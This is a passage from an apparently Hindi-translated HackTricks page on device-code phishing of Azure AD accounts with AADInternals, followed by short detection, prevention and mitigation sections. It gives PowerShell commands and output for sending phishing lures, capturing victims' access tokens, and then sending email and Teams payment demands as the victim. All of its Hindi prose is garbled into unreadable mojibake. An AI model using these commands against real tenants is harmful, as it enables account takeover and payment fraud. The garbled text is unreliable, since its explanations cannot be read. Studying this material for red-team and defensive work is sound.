Send-AADIntOutlookMessage -AccessToken $EXOresponse.access_token -Recipient "another.wictim@target.org" -Subject "Overdue payment" -Message "Pay this <h2>asap!</h2>"
```
## AADInternals рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдлрд╝рд┐рд╢рд┐рдВрдЧ рдХреЗ рд▓рд┐рдП <a href="#using-aadinternals-for-phishing" id="using-aadinternals-for-phishing"></a>

AADInternals (v0.4.4 рдпрд╛ рдмрд╛рдж рдХреЗ рд╕рдВрд╕реНрдХрд░рдг) рдореЗрдВ [Invoke-AADIntPhishing](https://o365blog.com/aadinternals/#invoke-aadintphishing) рдлрд╝рдВрдХреНрд╢рди рд╣реИ рдЬреЛ рдлрд╝рд┐рд╢рд┐рдВрдЧ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдХрд░рддрд╛ рд╣реИред

рдлрд╝рд┐рд╢рд┐рдВрдЧ рд╕рдВрджреЗрд╢ рдХреЛ рдЕрдиреБрдХреВрд▓рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╕рдВрджреЗрд╢ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╣реИ:
```
'<div>Hi!<br/>This is a message sent to you by someone who is using <a href="https://o365blog.com/aadinternals">AADInternals</a> phishing function. <br/><br/>Here is a <a href="{1}">link</a> you <b>should not click</b>.<br/><br/>If you still decide to do so, provide the following code when requested: <b>{0}</b>.</div>'
```
### рдИрдореЗрд▓ <a href="#email" id="email"></a>

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЙрджрд╛рд╣рд░рдг рдПрдХ рдЕрдиреБрдХреВрд▓рд┐рдд рд╕рдВрджреЗрд╢ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдлрд╝рд┐рд╢рд┐рдВрдЧ рдИрдореЗрд▓ рднреЗрдЬрддрд╛ рд╣реИред рдЯреЛрдХрди рдХреЛ рдХреИрд╢ рдореЗрдВ рд╕рд╣реЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИред
```powershell
# Create a custom message

$message = '<html>Hi!<br/>Here is the link to the <a href="{1}">document</a>. Use the following code to access: <b>{0}</b>.</html>'

# Send a phishing email to recipients using a customised message and save the tokens to cache

Invoke-AADPhishing -Recipients "wvictim@company.com","wvictim2@company.com" -Subject "Johnny shared a document with you" -Sender "Johnny Carson <jc@somewhere.com>" -SMTPServer smtp.myserver.local -Message $message -SaveToCache
```

```
Code: CKDZ2BURF
Mail sent to: wvictim@company.com
...
Received access token for william.victim@company.com
```
рдФрд░ рдЕрдм рд╣рдо рдХреИрд╢ рдХрд┐рдП рдЧрдП рдЯреЛрдХрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреАрдбрд╝рд┐рдд рдХреЗ рд░реВрдк рдореЗрдВ рдИрдореЗрд▓ рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВред
```powershell
# Send email as the victim

Send-AADIntOutlookMessage -Recipient "another.wictim@target.org" -Subject "Overdue payment" -Message "Pay this <h2>asap!</h2>"
```
рд╣рдо рднреБрдЧрддрд╛рди рдЕрдиреБрд░реЛрдз рдХреЛ рдФрд░ рдЕрдзрд┐рдХ рддрд╛рддреНрдХрд╛рд▓рд┐рдХ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП Teams рд╕рдВрджреЗрд╢ рднреА рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВ:
```powershell
# Send Teams message as the victim

Send-AADIntTeamsMessage -Recipients "another.wictim@target.org" -Message "Just sent you an email about due payment. Have a look at it."
```

```
Sent                MessageID
----                ---------
16/10/2020 14.40.23 132473328207053858
```
**рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╡реАрдбрд┐рдпреЛ рджрд┐рдЦрд╛рддрд╛ рд╣реИ рдХрд┐ AADInternals рдХрд╛ рдЙрдкрдпреЛрдЧ рдИрдореЗрд▓ рдлрд╝рд┐рд╢рд┐рдВрдЧ рдХреЗ рд▓рд┐рдП рдХреИрд╕реЗ рдХрд░реЗрдВред**

### Teams <a href="#teams" id="teams"></a>

AADInternals Teams рдЪреИрдЯ рд╕рдВрджреЗрд╢реЛрдВ рдХреЗ рд░реВрдк рдореЗрдВ рдлрд╝рд┐рд╢рд┐рдВрдЧ рд╕рдВрджреЗрд╢ рднреЗрдЬрдиреЗ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИред

**рдзреНрдпрд╛рди рджреЗрдВ!** рдкреАрдбрд╝рд┐рдд рдХреЗ "рдкреНрд░рдорд╛рдгрд┐рдд" рд╣реЛрдиреЗ рдХреЗ рдмрд╛рдж рдФрд░ рдЯреЛрдХрди рдкреНрд░рд╛рдкреНрдд рд╣реЛрдиреЗ рдкрд░, AADInternals рдореВрд▓ рд╕рдВрджреЗрд╢ рдХреЛ рдмрджрд▓ рджреЗрдЧрд╛ред рдЗрд╕ рд╕рдВрджреЗрд╢ рдХреЛ -CleanMessage рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рд╕рд╛рде рдкреНрд░рджрд╛рди рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдХреНрд▓реАрди рд╕рдВрджреЗрд╢ рд╣реИ:
```
'<div>Hi!<br/>This is a message sent to you by someone who is using <a href="https://o365blog.com/aadinternals">AADInternals</a> phishing function. <br/>If you are seeing this, <b>someone has stolen your identity!</b>.</div>'
```
```markdown
![Teams рд╕рд╛рдл рд╕рдВрджреЗрд╢](https://o365blog.com/images/posts/phishing_13.png)

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЙрджрд╛рд╣рд░рдг рдПрдХ рдлрд╝рд┐рд╢рд┐рдВрдЧ рдИрдореЗрд▓ рдХрд╕реНрдЯрдорд╛рдЗрдЬрд╝реНрдб рд╕рдВрджреЗрд╢реЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рднреЗрдЬрддрд╛ рд╣реИред рдЯреЛрдХрди рдХреЛ рдХреИрд╢ рдореЗрдВ рд╕рд╣реЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИред
```
```powershell
# Get access token for Azure Core Management

Get-AADIntAccessTokenForAzureCoreManagement -SaveToCache

# Create the custom messages

$message = '<html>Hi!<br/>Here is the link to the <a href="{1}">document</a>. Use the following code to access: <b>{0}</b>.</html>'
$cleanMessage = '<html>Hi!<br/>Have a nice weekend.</html>'

# Send a teams message to the recipient using customised messages

Invoke-AADPhishing -Recipients "wvictim@company.com" -Teams -Message $message -CleanMessage $cleanMessage -SaveToCache
```

```
Code: CKDZ2BURF
Teams message sent to: wvictim@company.com. Message id: 132473151989090816
...
Received access token for william.victim@company.com
```
**рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╡реАрдбрд┐рдпреЛ рджрд┐рдЦрд╛рддрд╛ рд╣реИ рдХрд┐ Teams рдлрд╝рд┐рд╢рд┐рдВрдЧ рдХреЗ рд▓рд┐рдП AADInternals рдХрд╛ рдЙрдкрдпреЛрдЧ рдХреИрд╕реЗ рдХрд░реЗрдВред**

## рдкрддрд╛ рд▓рдЧрд╛рдирд╛ <a href="#detecting" id="detecting"></a>

рд╕рдмрд╕реЗ рдкрд╣рд▓реЗ, Azure AD рдХреА рджреГрд╖реНрдЯрд┐ рд╕реЗ рд▓реЙрдЧрд┐рди рд╡рд╣рд╛рдБ рд╣реЛрддрд╛ рд╣реИ рдЬрд╣рд╛рдБ рдкреНрд░рдорд╛рдгреАрдХрд░рдг **рдЖрд░рдВрдн** рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред рдпрд╣ рд╕рдордЭрдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдмрд╣реБрдд рдорд╣рддреНрд╡рдкреВрд░реНрдг рдмрд┐рдВрджреБ рд╣реИред рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рд╕рд╛рдЗрдирд┐рдВрдЧ рд▓реЙрдЧ рдореЗрдВ, рд▓реЙрдЧрд┐рди **рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рд╕реНрдерд╛рди рдФрд░ рдбрд┐рд╡рд╛рдЗрд╕** рд╕реЗ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдирд╣реАрдВред

рд╣рд╛рд▓рд╛рдВрдХрд┐, рд░рд┐рдлреНрд░реЗрд╢ рдЯреЛрдХрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдП рдЧрдП рдПрдХреНрд╕реЗрд╕ рдЯреЛрдХрди **рд╕рд╛рдЗрдирд┐рдВрдЧ рд▓реЙрдЧ рдореЗрдВ рдирд╣реАрдВ рджрд┐рдЦрд╛рдИ рджреЗрддреЗ рд╣реИрдВ!**

рдиреАрдЪреЗ рдПрдХ рдЙрджрд╛рд╣рд░рдг рд╣реИ рдЬрд╣рд╛рдБ рдореИрдВрдиреЗ рдлрд╝рд┐рд╢рд┐рдВрдЧ рдХреЛ Azure VM рд╕реЗ рдЖрд░рдВрдн рдХрд┐рдпрд╛ (рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ, [cloud shell](https://o365blog.com/post/cloudshell/) рд╕реЗ рдЕрдзрд┐рдХ рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ)ред рдЬреИрд╕рд╛ рдХрд┐ рд╣рдо рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ, "Microsoft Office" рдХреНрд▓рд╛рдЗрдВрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд▓реЙрдЧрд┐рди рд╕реБрдмрд╣ 7:23 рдмрдЬреЗ ip-рдкрддреЗ 51.144.240.233 рд╕реЗ рд╣реБрдЖред рд╣рд╛рд▓рд╛рдВрдХрд┐, Exchange Online рдХреЗ рд▓рд┐рдП рдПрдХреНрд╕реЗрд╕ рдЯреЛрдХрди рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рд╕реБрдмрд╣ 7:27 рдмрдЬреЗ рд▓реЙрдЧ рдореЗрдВ рдирд╣реАрдВ рджрд┐рдЦрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИред

![Azure AD рд╕рд╛рдЗрдирд┐рдВрдЧ рд▓реЙрдЧ](https://o365blog.com/images/posts/phishing\_10.png)

:warning: рдпрджрд┐ рд╕рдВрдХреЗрдд рд╣реИрдВ рдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЕрд╕рд╛рдорд╛рдиреНрдп рд╕реНрдерд╛рдиреЛрдВ рд╕реЗ рд╕рд╛рдЗрди рдЗрди рдХрд░ рд░рд╣рд╛ рд╣реИ, рддреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЦрд╛рддрд╛ рд╕рдордЭреМрддрд╛ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред

## рд░реЛрдХрдерд╛рдо <a href="#preventing" id="preventing"></a>

рдЗрд╕ рддрдХрдиреАрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдлрд╝рд┐рд╢рд┐рдВрдЧ рдХреЛ рд░реЛрдХрдиреЗ рдХрд╛ рдПрдХрдорд╛рддреНрд░ рдкреНрд░рднрд╛рд╡реА рддрд░реАрдХрд╛ [Conditional Access](https://docs.microsoft.com/en-us/azure/active-directory/conditional-access/overview) (CA) рдиреАрддрд┐рдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реИред рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ, **рдлрд╝рд┐рд╢рд┐рдВрдЧ рдХреЛ рд░реЛрдХрд╛ рдирд╣реАрдВ рдЬрд╛ рд╕рдХрддрд╛**, рд▓реЗрдХрд┐рди рд╣рдо **рдХреБрдЫ рдирд┐рдпрдореЛрдВ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рд╕рд╛рдЗрди рдЗрди рдХрд░рдиреЗ рд╕реЗ рд░реЛрдХ рд╕рдХрддреЗ рд╣реИрдВ**ред рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рд╕реНрдерд╛рди рдФрд░ рдбрд┐рд╡рд╛рдЗрд╕ рд╕реНрдерд┐рддрд┐ рдЖрдзрд╛рд░рд┐рдд рдиреАрддрд┐рдпрд╛рдБ рдЦрд╛рддреЛрдВ рдХреА рд╕реБрд░рдХреНрд╖рд╛ рдХреЗ рд▓рд┐рдП рдкреНрд░рднрд╛рд╡реА рд╣реИрдВред рдпрд╣ рд╕рднреА рд╡рд░реНрддрдорд╛рди рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛ рд░рд╣реА рдлрд╝рд┐рд╢рд┐рдВрдЧ рддрдХрдиреАрдХреЛрдВ рдХреЗ рд▓рд┐рдП рд▓рд╛рдЧреВ рд╣реЛрддрд╛ рд╣реИред

рд╣рд╛рд▓рд╛рдВрдХрд┐, рд╕рднреА рдкрд░рд┐рджреГрд╢реНрдпреЛрдВ рдХреЛ рдХрд╡рд░ рдХрд░рдирд╛ рд╕рдВрднрд╡ рдирд╣реАрдВ рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдЕрд╡реИрдз рд╕реНрдерд╛рдиреЛрдВ рд╕реЗ рд▓реЙрдЧрд┐рди рдХреЗ рд▓рд┐рдП MFA рдХреЛ рдордЬрдмреВрд░ рдХрд░рдирд╛ рдорджрдж рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИ рдЕрдЧрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ MFA рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд▓реЙрдЧрд┐рди рдХрд░ рд░рд╣рд╛ рд╣реИред

## рдХрдо рдХрд░рдирд╛ <a href="#mitigating" id="mitigating"></a>

рдпрджрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕рдордЭреМрддрд╛ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░рд┐рдлреНрд░реЗрд╢ рдЯреЛрдХрди рдХреЛ [рд░рд┐рд╡реЛрдХ](https://docs.microsoft.com/en-us/powershell/module/azuread/revoke-azureaduserallrefreshtoken?view=azureadps-2.0) рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬреЛ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рд╕рдордЭреМрддрд╛ рдХрд┐рдП рдЧрдП рд░рд┐рдлреНрд░реЗрд╢ рдЯреЛрдХрди рдХреЗ рд╕рд╛рде рдирдП рдПрдХреНрд╕реЗрд╕ рдЯреЛрдХрди рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рд╕реЗ рд░реЛрдХрддрд╛ рд╣реИред

## рд╕рд╛рд░рд╛рдВрд╢ <a href="#summary" id="summary"></a>

рдЬрд╣рд╛рдБ рддрдХ рдореБрдЭреЗ рдкрддрд╛ рд╣реИ, рдбрд┐рд╡рд╛рдЗрд╕ рдХреЛрдб рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░рд╡рд╛рд╣ рддрдХрдиреАрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдкрд╣рд▓реЗ рдлрд╝рд┐рд╢рд┐рдВрдЧ рдХреЗ рд▓рд┐рдП рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред

рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рджреГрд╖реНрдЯрд┐рдХреЛрдг рд╕реЗ, рдЗрд╕ рд╡рд┐рдзрд┐ рдореЗрдВ рдХреБрдЫ рдлрд╛рдпрджреЗ рд╣реИрдВ:

* рдХрд┐рд╕реА рднреА рдРрдкреНрд╕ рдХреЛ рд░рдЬрд┐рд╕реНрдЯрд░ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИ
* рдирдХрд▓реА рд▓реЙрдЧрд┐рди рдкреГрд╖реНрдареЛрдВ рдЖрджрд┐ рдХреЗ рд▓рд┐рдП рдлрд╝рд┐рд╢рд┐рдВрдЧ рдЗрдВрдлреНрд░рд╛рд╕реНрдЯреНрд░рдХреНрдЪрд░ рд╕реЗрдЯрдЕрдк рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИ
* рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕реЗ рдХреЗрд╡рд▓ рд╕рд╛рдЗрди рдЗрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ (рдЖрдорддреМрд░ рдкрд░ "Microsoft Office" рдХреЗ рд▓рд┐рдП) - рдХреЛрдИ рд╕рд╣рдорддрд┐ рдирд╣реАрдВ рдорд╛рдВрдЧреА рдЬрд╛рддреА рд╣реИ
* рд╕рдм рдХреБрдЫ **login.microsoftonline.com** рдирд╛рдорд╕реНрдерд╛рди рдореЗрдВ рд╣реЛрддрд╛ рд╣реИ
* рд╣рдорд▓рд╛рд╡рд░ рдХрд┐рд╕реА рднреА client\_id рдФрд░ рд╕рдВрд╕рд╛рдзрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИ (рд╣рд╛рд▓рд╛рдВрдХрд┐ рд╕рднреА рд╕рдВрдпреЛрдЬрди рдХрд╛рдо рдирд╣реАрдВ рдХрд░рддреЗ)
* рдпрджрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ MFA рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕рд╛рдЗрди рдЗрди рдХрд┐рдпрд╛ рд╣реИ, рддреЛ рдПрдХреНрд╕реЗрд╕ рдЯреЛрдХрди рдореЗрдВ рднреА MFA рджрд╛рд╡рд╛ рд╣реЛрддрд╛ рд╣реИ (рдЗрд╕рдореЗрдВ рд░рд┐рдлреНрд░реЗрд╢ рдЯреЛрдХрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдП рдЧрдП рдПрдХреНрд╕реЗрд╕ рдЯреЛрдХрди рднреА рд╢рд╛рдорд┐рд▓ рд╣реИрдВ)
* рд░реЛрдХрдерд╛рдо рдХреЗ рд▓рд┐рдП Conditional Access (рдФрд░ Azure AD Premium P1/P2 рд▓рд╛рдЗрд╕реЗрдВрд╕) рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ

рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рджреГрд╖реНрдЯрд┐рдХреЛрдг рд╕реЗ, рдЗрд╕ рд╡рд┐рдзрд┐ рдореЗрдВ рдХрдо рд╕реЗ рдХрдо рдПрдХ рдиреБрдХрд╕рд╛рди рд╣реИ:

* рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛрдб рдХреЗрд╡рд▓ 15 рдорд┐рдирдЯ рдХреЗ рд▓рд┐рдП рдорд╛рдиреНрдп рд╣реИ

рдмреЗрд╢рдХ, рд╣рдорд▓рд╛рд╡рд░ рд╕рдордп рдкреНрд░рддрд┐рдмрдВрдз рдХреЛ рдХрдо рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдлрд╝рд┐рд╢рд┐рдВрдЧ рдИрдореЗрд▓ рдХреЛ рдХрдИ рдкреНрд░рд╛рдкреНрддрдХрд░реНрддрд╛рдУрдВ рдХреЛ рднреЗрдЬрдХрд░ - рдЗрд╕рд╕реЗ рд╕рдВрднрд╛рд╡рдирд╛ рдмрдврд╝ рдЬрд╛рдПрдЧреА рдХрд┐ рдХреЛрдИ рдХреЛрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕рд╛рдЗрди рдЗрди рдХрд░рддрд╛ рд╣реИред

рдПрдХ рдЕрдиреНрдп рддрд░реАрдХрд╛ рд╣реИ [рдкреНрд░реЙрдХреНрд╕реА](https://gist.github.com/Mr-Un1k0d3r/afef5a80cb72dfeaa78d14465fb0d333) рдХрд╛ рдХрд╛рд░реНрдпрд╛рдиреНрд╡рдпрди рдХрд░рдирд╛ рдЬреЛ рд▓рд┐рдВрдХ рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░рддреЗ рд╕рдордп рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдЖрд░рдВрдн рдХрд░реЗрдЧрд╛ (рд╢реНрд░реЗрдп [@MrUn1k0d3r](https://twitter.com/MrUn1k0d3r) рдХреЛ)ред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЗрд╕ рддрд░рд╣ рд╕реЗ рдПрдХ рд╡реИрдз microsoft.com url рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХрд╛ рд▓рд╛рдн рдЦреЛ рджрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред

рдлрд╝рд┐рд╢рд┐рдВрдЧ рдЕрднрд┐рдпрд╛рдиреЛрдВ рд╕реЗ рдмрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдЪреЗрдХрд▓рд┐рд╕реНрдЯ:

1. **рдЕрдкрдиреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ** рд╕реВрдЪрдирд╛ рд╕реБрд░рдХреНрд╖рд╛ рдФрд░ рдлрд╝рд┐рд╢рд┐рдВрдЧ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рд╢рд┐рдХреНрд╖рд┐рдд рдХрд░реЗрдВ :woman\_teacher:
2. рдорд▓реНрдЯреА-рдлреИрдХреНрдЯрд░ рдкреНрд░рдорд╛рдгреАрдХрд░рдг (MFA) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ :iphone:
3. Intune :hammer\_and\_wrench: рдФрд░ Conditional Access (CA) :stop\_sign: рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ

\

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
